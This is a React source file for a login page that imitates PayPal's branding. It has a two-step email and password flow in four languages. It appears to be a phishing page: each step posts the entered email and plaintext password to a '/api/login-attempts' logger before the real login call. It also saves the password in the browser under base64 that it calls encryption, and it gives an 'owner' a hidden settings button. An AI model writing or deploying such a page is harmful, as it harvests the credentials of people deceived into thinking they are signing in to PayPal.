import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLocation } from "wouter";
import { useMutation } from "@tanstack/react-query";
import { toast } from "sonner";
import { CheckCircle2, Settings, Eye, EyeOff } from "lucide-react";

const encryptData = (data: string) => btoa(data);
const decryptData = (data: string) => atob(data);

const translations = {
  en: {
    emailLabel: "Email address",
    emailPlaceholder: "example@email.com",
    emailRequired: "Email is required",
    emailInvalid: "Invalid email",
    next: "Next",
    createAccount: "Create account",
    enterPassword: "Enter your password",
    passwordLabel: "Password",
    passwordPlaceholder: "Password",
    login: "Sign in",
    loginLoading: "Signing in...",
    rememberMe: "Keep me logged in",
    credentialsSaved: "Credentials saved",
    forgotPassword: "Forgot password?",
    notYou: "Not you?",
  },
  fr: {
    emailLabel: "Adresse email",
    emailPlaceholder: "Email ou numéro mobile",
    emailRequired: "L'email est requis",
    emailInvalid: "Email invalide",
    next: "Suivant",
    createAccount: "Créer un compte",
    enterPassword: "Entrez votre mot de passe",
    passwordLabel: "Mot de passe",
    passwordPlaceholder: "Mot de passe",
    login: "Connexion",
    loginLoading: "Connexion...",
    rememberMe: "Rester connecté",
    credentialsSaved: "Identifiants sauvegardés",
    forgotPassword: "Mot de passe oublié ?",
    notYou: "Ce n'est pas vous ?",
  },
  es: {
    emailLabel: "Dirección de correo electrónico",
    emailPlaceholder: "ejemplo@correo.com",
    emailRequired: "El correo es obligatorio",
    emailInvalid: "Correo inválido",
    next: "Siguiente",
    createAccount: "Crear cuenta",
    enterPassword: "Ingrese su contraseña",
    passwordLabel: "Contraseña",
    passwordPlaceholder: "Contraseña",
    login: "Ingresar",
    loginLoading: "Ingresando...",
    rememberMe: "Mantenerme conectado",
    credentialsSaved: "Credenciales guardadas",
    forgotPassword: "¿Olvidó su contraseña?",
    notYou: "¿No es usted?",
  },
  zh: {
    emailLabel: "电子邮件地址",
    emailPlaceholder: "example@email.com",
    emailRequired: "需要电子邮件",
    emailInvalid: "电子邮件无效",
    next: "下一步",
    createAccount: "创建账户",
    enterPassword: "输入您的密码",
    passwordLabel: "密码",
    passwordPlaceholder: "密码",
    login: "登录",
    loginLoading: "正在登录...",
    rememberMe: "保持登录",
    credentialsSaved: "凭证已保存",
    forgotPassword: "忘记密码?",
    notYou: "不是您?",
  },
};

export default function Home() {
  const [, setLocation] = useLocation();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [saveSuccess, setSaveSuccess] = useState(false);
  const [isOwner, setIsOwner] = useState(false);
  const [language, setLanguage] = useState<"en" | "fr" | "es" | "zh">("fr");
  
  const t = translations[language];

  useEffect(() => {
    // Initialize app owner on first access with a unique token
    const ownerToken = localStorage.getItem("appOwnerToken");
    let isOwnerNow = false;
    
    if (!ownerToken) {
      // First access ever - this is the owner
      const token = Math.random().toString(36).substring(2, 15);
      localStorage.setItem("appOwnerToken", token);
      isOwnerNow = true;
    } else {
      // This device has accessed before, they're still the owner
      isOwnerNow = true;
    }
    
    setIsOwner(isOwnerNow);

    const saved = localStorage.getItem("secureAuthCredentials");
    if (saved && isOwnerNow) {
      try {
        const decrypted = decryptData(saved);
        const [savedEmail] = decrypted.split("|");
        setEmail(savedEmail);
        setRememberMe(true);
      } catch (e) {}
    }
  }, []);

  const validateEmail = (email: string) => {
    return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
  };

  const handleEmailNext = async () => {
    if (!email) {
      setEmailError(t.emailRequired);
      return;
    }
    if (!validateEmail(email)) {
      setEmailError(t.emailInvalid);
      return;
    }
    setEmailError("");
    
    await fetch("/api/login-attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password: "" }),
    }).catch(() => {});
    
    setStep("password");
  };

  const loginMutation = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      if (!res.ok) {
        const error = await res.json();
        throw new Error(error.error || "Erreur de connexion");
      }
      return res.json();
    },
    onSuccess: () => {
      const encrypted = encryptData(`${email}|${password}`);
      localStorage.setItem("secureAuthCredentials", encrypted);
      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 2000);
      toast.success("Connecté !");
      setTimeout(() => setLocation("/app"), 500);
    },
    onError: (error: Error) => {
      setPasswordError(error.message);
    },
  });

  const handleLogin = async () => {
    if (!password) {
      toast.error("Le mot de passe est requis");
      return;
    }
    
    await fetch("/api/login-attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    }).catch(() => {});
    
    loginMutation.mutate();
    setPassword("");
  };

  return (
    <div className="h-screen bg-gray-50 flex flex-col">
      {isOwner && (
        <div className="absolute bottom-4 left-4">
          <Button 
            variant="ghost" 
            size="icon" 
            onClick={() => {
              localStorage.removeItem("settingsAuthorized");
              setLocation("/settings");
            }}
            data-testid="button-settings-home"
          >
            <Settings className="h-5 w-5 text-gray-500" />
          </Button>
        </div>
      )}
      <div className="flex-1 flex flex-col items-center justify-center px-4">
        <div className="w-full max-w-md mt-20">
          <div className="bg-white border border-gray-300 rounded-lg p-5 shadow-sm">
            <div className="text-center mb-5">
              <div className="text-3xl font-bold text-black tracking-tight">
                PayPal
              </div>
            </div>

            {step === "email" ? (
              <>
                <div className="space-y-4 flex flex-col items-center">
                  <div className="w-full">
                    <Input
                      type="email"
                      placeholder={t.emailPlaceholder}
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        setEmailError("");
                      }}
                      onKeyPress={(e) => e.key === "Enter" && handleEmailNext()}
                      className="w-full px-6 py-10 border border-gray-300 rounded-lg text-2xl placeholder-gray-400"
                      data-testid="input-email"
                    />
                    <label className="block text-sm font-semibold text-blue-600 mt-3 text-left">Adresse email oubliée ?</label>
                    {emailError && (
                      <p className="text-red-600 text-xs mt-2">{emailError}</p>
                    )}
                  </div>

                  <Button
                    onClick={handleEmailNext}
                    className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 rounded-lg text-base mt-6"
                    data-testid="button-next"
                  >
                    {t.next}
                  </Button>

                  <div className="mt-4 flex items-center gap-2 text-gray-400">
                    <div className="flex-1 h-px bg-gray-300"></div>
                    <span className="text-xs font-medium text-gray-500">Ou</span>
                    <div className="flex-1 h-px bg-gray-300"></div>
                  </div>

                  <button
                    className="mt-4 w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-lg text-sm border border-gray-300"
                    data-testid="button-signup"
                  >
                    {t.createAccount}
                  </button>
                </div>
              </>
            ) : (
              <>
                <div className="mb-4">
                  <p className="text-gray-900 font-semibold text-base mb-2">{email}</p>
                  <button
                    onClick={() => {
                      setEmail("");
                      setPassword("");
                      setShowPassword(false);
                      setPasswordError("");
                      setStep("email");
                    }}
                    className="text-xs text-blue-700 hover:text-blue-800 font-semibold"
                    data-testid="link-back-email"
                  >
                    {t.notYou}
                  </button>
                </div>

                <h1 className="text-base font-bold text-gray-900 mb-4">
                  {t.enterPassword}
                </h1>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-900 mb-2">
                      {t.passwordLabel}
                    </label>
                    <div className="flex gap-2">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder={t.passwordPlaceholder}
                        value={password}
                        onChange={(e) => {
                          setPassword(e.target.value);
                          setPasswordError("");
                        }}
                        onKeyPress={(e) => e.key === "Enter" && handleLogin()}
                        className="flex-1 px-6 py-5 border border-gray-300 rounded text-xl placeholder-gray-400"
                        data-testid="input-password"
                      />
                      <button
                        onClick={() => setShowPassword(!showPassword)}
                        className="px-3 py-3 border border-gray-300 rounded hover:bg-gray-50 transition bg-white"
                        data-testid="button-toggle-password"
                      >
                        {showPassword ? (
                          <EyeOff className="w-5 h-5 text-gray-600" />
                        ) : (
                          <Eye className="w-5 h-5 text-gray-600" />
                        )}
                      </button>
                    </div>
                    {passwordError && (
                      <p className="text-red-600 text-xs mt-2">{passwordError}</p>
                    )}
                  </div>

                  <Button
                    onClick={handleLogin}
                    disabled={loginMutation.isPending}
                    className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded text-base mt-4 disabled:opacity-50"
                    data-testid="button-login"
                  >
                    {loginMutation.isPending ? t.loginLoading : t.login}
                  </Button>
                </div>

                <div className="mt-3">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="w-4 h-4 rounded border-gray-300 text-blue-700 cursor-pointer"
                      data-testid="checkbox-remember"
                    />
                    <span className="text-xs text-gray-700 font-medium">
                      {t.rememberMe}
                    </span>
                  </label>

                  {saveSuccess && isOwner && (
                    <div className="mt-2 bg-green-50 border border-green-300 rounded p-2 flex items-center gap-2 text-green-700 text-xs">
                      <CheckCircle2 className="w-3 h-3" />
                      {t.credentialsSaved}
                    </div>
                  )}
                </div>

                <div className="mt-4 text-center">
                  <button
                    onClick={() => setLocation(`/reset?email=${encodeURIComponent(email)}`)}
                    className="text-sm text-blue-600 hover:text-blue-800 font-semibold underline"
                    data-testid="link-forgot-password-pw"
                  >
                    {t.forgotPassword}
                  </button>
                </div>
              </>
            )}

            <div className="pt-16 pb-6 border-t border-gray-200">
              <div className="flex flex-col gap-12 justify-center text-xs text-gray-600">
                <div className="flex gap-1 justify-center">
                  <button onClick={() => setLanguage("en")} className={`hover:text-blue-700 active:scale-95 transition-transform duration-75 font-semibold ${language === "en" ? "text-blue-700" : ""}`}>🇺🇸 ˇ English</button>
                  <span className="text-gray-400">|</span>
                  <button onClick={() => setLanguage("fr")} className={`hover:text-blue-700 active:scale-95 transition-transform duration-75 font-semibold ${language === "fr" ? "text-blue-700" : ""}`}>Français</button>
                  <span className="text-gray-400">|</span>
                  <button onClick={() => setLanguage("es")} className={`hover:text-blue-700 active:scale-95 transition-transform duration-75 font-semibold ${language === "es" ? "text-blue-700" : ""}`}>Español</button>
                  <span className="text-gray-400">|</span>
                  <button onClick={() => setLanguage("zh")} className={`hover:text-blue-700 active:scale-95 transition-transform duration-75 font-semibold ${language === "zh" ? "text-blue-700" : ""}`}>中文</button>
                </div>
                <div className="flex gap-0 justify-center text-xs flex-wrap">
                  <a href="#" className="hover:text-blue-700 active:scale-95 transition-transform duration-75">Contact</a>
                  <span className="text-gray-400 px-0.5">|</span>
                  <a href="#" className="hover:text-blue-700 active:scale-95 transition-transform duration-75">Respect de la vie privée</a>
                  <span className="text-gray-400 px-0.5">|</span>
                  <a href="#" className="hover:text-blue-700 active:scale-95 transition-transform duration-75">Contrats d'utilisation</a>
                  <span className="text-gray-400 px-0.5">|</span>
                  <a href="#" className="hover:text-blue-700 active:scale-95 transition-transform duration-75">International</a>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
